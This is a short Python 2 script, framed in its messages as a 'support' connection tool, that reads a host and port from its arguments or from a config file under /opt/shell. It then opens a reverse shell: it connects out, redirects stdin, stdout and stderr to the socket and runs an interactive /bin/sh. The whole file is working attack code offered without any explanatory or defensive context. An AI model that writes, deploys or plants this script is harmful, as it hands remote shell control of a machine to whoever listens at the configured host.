#!/usr/bin/python
import socket,subprocess,os,sys,re;


if len(sys.argv) == 3:


    is_valid_port = re.match("^[0-9]{2,5}$", sys.argv[2])
    is_valid = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", sys.argv[1])
    is_valid_dns = re.match("^(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9])$", sys.argv[1])
  
  
    if is_valid:
      host = sys.argv[1]
    elif is_valid_dns:
      try:
        host = socket.gethostbyname(sys.argv[1])
      except Exception, e:
        print "Host Found. Please retry."
        sys.exit(1) 
    else :    
      print "Invalid IP/DNS.\n"
      sys.exit(1)
    
    
    if is_valid_port:
      port = int(sys.argv[2])
    else :    
      print "Invalid Port.\n"
      sys.exit(1)  

else:
   supports = open('/opt/shell/support.conf', 'r').read()
   support = supports.split(':')
   host = str(support[0])
   port = int(support[1])


#print "connect to "+host +" "+str(port)+" >>>\n"
try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect((host,port));
  os.dup2(s.fileno(),0); 
  os.dup2(s.fileno(),1); 
  os.dup2(s.fileno(),2);
  p=subprocess.call(['/bin/sh','-i']);
except Exception, e: 
    print "No connection is aviable for support. Please retry."
    sys.exit(1)
    #print e

   